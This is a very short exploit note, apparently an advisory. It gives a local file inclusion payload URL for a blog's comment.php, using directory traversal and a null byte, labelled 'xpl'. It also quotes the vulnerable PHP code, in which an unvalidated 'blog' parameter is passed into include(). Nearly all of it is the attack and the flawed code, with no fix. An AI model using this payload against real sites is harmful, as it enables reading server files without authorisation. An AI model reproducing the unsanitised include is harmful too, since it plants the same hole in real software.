xpl :   

http://site.com/comment.php?blog=../../../../../../../../../../LFI%00  

   

<?php   

session_start();  

require ('data/settings.php');  

include ('data/posts/'.$_GET['blog'].'.txt'); <== LFI vuln  

?>  

